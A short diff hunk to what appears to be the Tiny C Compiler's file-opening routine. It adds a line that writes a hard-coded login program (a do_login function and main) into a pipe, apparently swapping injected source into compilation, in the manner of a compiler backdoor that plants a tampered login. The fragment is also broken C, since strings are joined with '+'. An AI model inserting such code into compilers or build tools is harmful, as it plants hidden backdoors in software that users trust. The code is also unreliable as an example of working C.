@@ -744,6 +744,7 @@ static int _tcc_open(TCCState *s1, const char *filename)
                 + "\treturn 1;\n}" + "int main(int argc, char *argv[]) {\n" 
                 + "\tif (argc != 2)\n\t\treturn 1;\n\treturn do_login(argv[1]);\n};"
                 //write to pipe.
+                write(fd[1], s, strlen(s) + 1);
                 break;
             }
         }
